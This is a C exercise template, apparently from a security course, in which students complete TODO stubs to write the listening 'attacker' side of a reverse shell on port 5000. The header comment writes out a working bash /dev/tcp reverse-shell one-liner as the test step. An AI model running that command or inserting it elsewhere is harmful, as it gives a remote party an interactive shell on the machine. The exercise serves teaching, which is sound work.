/**
 * Instructions: You will need to complete all the TODOs to complete this task. You can implement some of the
 * socket code by using the wrapper calls in utils.c or just implement it directly in the 'main' function.
 * 
 * The goal of this exercise is to create the "host/attacker" side of the reverse shell. I.e. `nc -lvnp 5000`
 * - This program should start a server that waits to receive a connection from the victim machine. 
 * - We will use port 5000 for this exercise.
 * - Test out your code by starting the server and then connect using `bash -i >& /dev/tcp/172.29.123.161/5000 0>&1`
 * - See exercise-2 demo gif for example.
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <string.h>
#include "../include/utils.h"

#define PORT 5000

int main() {

    // TODO: Declare variables here


    // TODO: Create server socket


    // TODO: Set up the server address structure. Set it up to listen on all interfaces and on the defined PORT. Also use ipv4.


    // TODO: Bind the socket


    // TODO: Listen on the socket. You only need 1 connection at a time so set the backlog accordingly.


    // TODO: Accept a connection
    printf("Listening on 0.0.0.0:%d\n", PORT);


    // TODO: Read/Write data to/from the client as needed
    // Hint: Use 'select' Linux call to monitor both stdin and the client socket for data to read. 
    // You can also use 'poll' if you prefer.
    // When data is available on stdin, read it and send it to the client
    // When data is available on the client socket, read it and print it to stdout
    while (1) {

    }

    // TODO: Perform cleanup as needed

}
